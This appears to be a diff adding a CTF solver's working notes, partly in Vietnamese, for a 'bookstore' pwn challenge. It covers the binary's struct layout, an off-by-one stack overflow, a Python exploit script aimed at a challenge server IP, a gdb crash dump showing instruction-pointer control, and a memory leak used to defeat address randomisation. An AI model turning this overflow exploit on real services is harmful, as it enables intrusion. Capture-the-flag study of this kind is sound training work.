@@ -1,0 +1,182 @@
+ ? description
+==========================================
+- Binary : http://binary.grayhash.com/7692931e710c1d805224c44ab97ddd52/bookstore
+- Server : 54.65.201.110
+- Port : TCP 31337
+- Flag Path : /home/bookstore/key
+==========================================
+
+ ? number of solvers : 0
+ ? breakthrough by
+
+bookstore là m?t ch??ng trình qu?n lí sách danh menu có các ch?c n?ng:
+    1. Add new item
+    2. Modify the item
+    3. View item's information.
+    4. Show item list
+    0. Exit
+    
+Chuong trinh su dung mot struct book de luu tru mot quyen sach
+Chuong trinh su dung mang struct va 1 bien toan cuc total de luu tru so luong sach (khong qua 20)
+
+
+BOOK STRUCT 
+00000000 book_info struc ; (sizeof=0x164)
+00000000 no      dd ?
+00000004 type    dd ?
+00000008 bookname db 20 dup(?)
+0000001C price   dd ?
+00000020 stock   dd ?
+00000024 fn_show_description dd ?                ; offset
+00000028 free_shipping dd ?
+0000002C fn_free_ship dd ?                       ; offset
+00000030 max_download dd ?
+00000034 avaliable dd ?
+00000038 description db 300 dup(?)
+00000164 book_info ends
+
+OFF BY ONE: => STACK OVERFLOW
+print_menu();            
+printf("> ");           
+ __isoc99_scanf("%d", &choice);      // Nhap lua chon           
+  if ( choice != 1 )              break;                            // Add item            
+  if ( total <= 20 )            {              
+      b = &books[total];              
+      inputbookinfo(&buf);              
+      qmemcpy(b, &buf, 356u);              
+      puts("Complete");            
+}            
+else            
+{              
+    printf("Too many items.");            
+}
+
+Khong overwrite duoc return address, chi overwrite duoc 1 so bien cuc bo trong ham main, tim cach overwrite function pointer
+L
+
+0xffffb674
+(20 book buffer)
+0xffffd244
+0xffffd260  
+buf
+0xffffd3a8 
+max-overflow
+0xffffd3dc choice
+0xffffd3e0  j
+0xffffd3ec  *books
+0xffffd408  ebp
+stackcookie
+savedframe
+ret
+
+
+Ma khai thac
+import socket
+import telnetlib
+
+s = socket.socket()
+s.connect(('128.199.123.177', 31337))
+
+def r_util(data):
+    d = s.recv(1024)
+    while d.find(data) == -1:
+        d += s.recv(1024)
+    return d
+
+def inputbook():
+    s.send('1\n')
+    print r_util('Bookname')
+    s.send('a'*19 + '\n')
+    print r_util('Description')
+    s.send('a'*299 + '\n')
+    print r_util('EBook')
+    s.send('0\n')
+    print r_util('>')
+
+def getbook():
+    s.send('3\n')
+    print r_util('No')
+    s.send('0\n')
+    print r_util('>')
+
+def modbook():
+    s.send('2\n')
+    print r_util('No')
+    s.send('0\n')
+    print r_util('main menu')
+    s.send('1\n')
+    print r_util('bookname')
+    
+        
+print r_util('Your ID')
+s.send('helloadmin\n')
+print r_util('Your PASSWORD')
+s.send('iulover!@#$\n')
+
+print r_util('>')
+for i in range(21):
+    print 'Book %d' % (i+1)
+    s.send('1\n')
+    print r_util('Bookname')
+    s.send('a'*19 + '\n')
+    print r_util('Description')
+    s.send('a'*299 + '\n')
+    print r_util('EBook')
+    s.send('0\n')
+    print r_util('>')
+s.send('1\n')
+print r_util('items')
+
+
+t = telnetlib.Telnet()                                                  
+t.sock = s                                                              
+t.interact()
+
+
+============================================================
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------------------------registers-----------------------------------------------------]
+EAX: 0x61616161 (b'aaaa')
+EBX: 0x56559000 --> 0x3efc 
+ECX: 0x13b 
+EDX: 0xffffb6f8 ('z' <repeats 20 times>, "PPPPSSSS\255YUV\001")
+ESI: 0xffffd424 --> 0x14 
+EDI: 0xffffb854 --> 0x0 
+EBP: 0xffffb6e8 --> 0xffffd5e8 --> 0x0 
+ESP: 0xffffb6cc ("|dUV\370\266\377\377PPPP\351S\346", <incomplete sequence \367>)
+EIP: 0x61616161 (b'aaaa')
+[-------------------------------------------------------code-------------------------------------------------------]
+Invalid $PC address: 0x61616161
+[------------------------------------------------------stack-------------------------------------------------------]
+00:0000| esp 0xffffb6cc ("|dUV\370\266\377\377PPPP\351S\346", <incomplete sequence \367>)
+01:0004|     0xffffb6d0 --> 0xffffb6f8 ('z' <repeats 20 times>, "PPPPSSSS\255YUV\001")
+02:0008|     0xffffb6d4 ("PPPP\351S\346", <incomplete sequence \367>)
+03:0012|     0xffffb6d8 --> 0xf7e653e9 (<__isoc99_scanf+9>:        add    ebx,0x154c17)
+04:0016|     0xffffb6dc --> 0x56559000 --> 0x3efc 
+05:0020|     0xffffb6e0 --> 0x0 
+06:0024|     0xffffb6e4 --> 0x56559000 --> 0x3efc 
+07:0028| ebp 0xffffb6e8 --> 0xffffd5e8 --> 0x0 
+[------------------------------------------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x61616161 in ?? ()
+gdb-peda$ hexdump 0xffffb6cc /10
+0x0000 0xffffb6cc ? 7c 64 55 56 f8 b6 ff ff 50 50 50 50 e9 53 e6 f7  ? |dUV....PPPP.S..
+0x0010 0xffffb6dc ? 00 90 55 56 00 00 00 00 00 90 55 56 e8 d5 ff ff  ? ..UV......UV....
+0x0020 0xffffb6ec ? 3c 69 55 56 13 00 00 00 00 00 00 00 7a 7a 7a 7a  ? <iUV........zzzz
+0x0030 0xffffb6fc ? 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a  ? zzzzzzzzzzzzzzzz
+0x0040 0xffffb70c ? 50 50 50 50 53 53 53 53 ad 59 55 56 01 00 00 00  ? PPPPSSSS.YUV....
+0x0050 0xffffb71c ? 61 61 61 61 61 61 61 61 01 00 00 00 5a 5a 5a 5a  ? aaaaaaaa....ZZZZ
+0x0060 0xffffb72c ? 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a  ? ZZZZZZZZZZZZZZZZ
+
+
+leak mem => biet duoc base cua chuong trinh:
+No : 18 | type (1: ebook, 0: book): 0 | name : zzzzzzzzzzzzzzzzzzzzPPPPSSSS?YUV | description : ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ | price : 1347440720 | stock : 1397969747No : 19 | type (1: ebook, 0: book): 0 | name : zzzzzzzzzzzzzzzzzzzzPPPPSSSS?YUV | description : ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ | price : 1347440720 | stock : 1397969747
+
+exploti: 
+    name = /home/bookstore/key
+    dia chi cal den: 000008DB - open file flag 
+
+
+
